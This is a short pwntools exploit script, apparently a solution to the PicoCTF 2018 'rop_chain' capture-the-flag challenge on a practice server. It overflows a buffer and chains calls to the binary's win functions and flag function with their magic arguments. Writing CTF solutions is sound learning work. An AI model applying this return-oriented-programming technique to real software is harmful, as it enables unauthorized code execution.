from pwn import *

proc_name = './PicoCTF_2018_rop_chain'

#p = process(proc_name)
p = remote('node4.buuoj.cn', 27638)
elf = ELF(proc_name)

pop_ebx_ret = 0x0804840d

f1 = elf.sym['win_function1']
f2 = elf.sym['win_function2']
flag = elf.sym['flag']

payload = b'a' *  ( 0x18 + 4 ) + p32(f1) + p32(f2) + p32(pop_ebx_ret) + p32(0x0BAAAAAAD) 
payload += p32(flag) + p32(0) + p32(0x0DEADBAAD)

p.sendlineafter('Enter your input> ', payload)

p.interactive()
